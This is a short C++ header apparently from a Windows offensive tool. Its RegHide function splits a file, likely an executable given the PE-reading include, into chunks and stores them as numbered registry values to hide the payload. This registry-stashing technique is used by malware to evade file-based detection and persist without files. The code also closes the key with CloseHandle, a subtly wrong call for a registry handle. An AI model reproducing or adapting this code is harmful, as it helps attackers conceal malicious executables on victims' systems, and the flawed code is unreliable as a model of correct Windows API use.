#pragma once

#include <string>

#include "base64.h"
#include "ReadPE.h"
#include "WinReg.h"


int RegHide(const char* const strPathToSourceFile, HKEY hRegPath, const char* const strRegKey, std::string strValuePrefix)
{

	size_t ValueSuffix = 1;

	// SPLIT UP THE FILE
	auto splitFile = SplitFile(strPathToSourceFile);
	HKEY hKey = OpenRegKey(hRegPath, strRegKey);

	// ITERATE PER ARRAY IN VECTOR
	for (size_t i = 0; i < splitFile.size(); ++i)
	{
		// SET REG KEY VALUE NAME AS 'PART#'
		std::string strValueName(strValuePrefix + std::to_string(ValueSuffix));

		// B64 ENCODE THE BYTES THEN WRITE TO REGISTRY KEY VALUE AS REG_SZ
		WriteToRegKeyValue(hKey, strValueName.c_str(), splitFile[i].data(), READ_WRITE_SIZE);
		++ValueSuffix;
	}

	CloseHandle(hKey);
	return 0;
}